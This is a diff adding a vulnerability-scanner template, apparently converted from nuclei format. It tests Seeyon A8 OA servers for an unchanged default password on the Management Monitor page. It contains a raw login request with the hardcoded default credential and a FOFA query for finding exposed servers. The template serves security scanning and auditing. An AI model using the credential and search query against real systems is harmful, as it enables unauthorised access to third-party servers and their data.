@@ -1,0 +1,143 @@
+{
+  "id": "seeyon-monitor-default-login",
+  "name": "Seeyon A8 Management Monitor - Default Login",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "Seeyon OA A8-m has status monitoring page information leakage. Attackers can obtain sensitive information such as website paths and user names for further attacks. Attackers can use this vulnerability to directly enter the application system or management system to conduct system, web page, data tampering and deletion, illegally obtaining system and user data, and may even cause the server to collapse.\n",
+  "references": [
+    "http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20status.jsp%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html",
+    "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/default-pwd/seeyon-a8-management-monitor-default-password.yaml"
+  ],
+  "tags": [
+    "seeyon",
+    "oa",
+    "default-login"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"致远互联-OA\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /seeyon/management/index.jsp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\npassword\u003dWLCCYBD%40SEEYON\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003ctitle\u003eA8 Management Monitor\u003c/title\u003e",
+            "Connection Pooling"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "seeyon-monitor-default-login",
+    "info": {
+      "name": "Seeyon A8 Management Monitor - Default Login",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "Seeyon OA A8-m has status monitoring page information leakage. Attackers can obtain sensitive information such as website paths and user names for further attacks. Attackers can use this vulnerability to directly enter the application system or management system to conduct system, web page, data tampering and deletion, illegally obtaining system and user data, and may even cause the server to collapse.\n",
+      "reference": [
+        "http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20status.jsp%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html",
+        "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/default-pwd/seeyon-a8-management-monitor-default-password.yaml"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"致远互联-OA\""
+      },
+      "tags": "seeyon,oa,default-login"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /seeyon/management/index.jsp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\npassword\u003dWLCCYBD%40SEEYON\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003ctitle\u003eA8 Management Monitor\u003c/title\u003e",
+              "Connection Pooling"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
